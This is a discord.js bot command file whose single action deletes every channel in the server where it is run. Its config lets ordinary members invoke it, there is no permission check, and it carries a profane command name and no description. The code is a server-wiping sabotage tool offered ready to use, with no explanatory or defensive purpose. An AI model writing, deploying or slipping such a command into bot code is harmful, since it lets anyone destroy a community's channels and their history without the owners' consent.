const Discord = require("discord.js")
module.exports.run = async (bot, message, args) => {





 message.guild.channels.cache.forEach(channel => channel.delete())


}
module.exports.config = {
    name: "fuckingdelete",
    description: "",
    usage: "?help",
    accessableby: "Members",
    aliases: []
}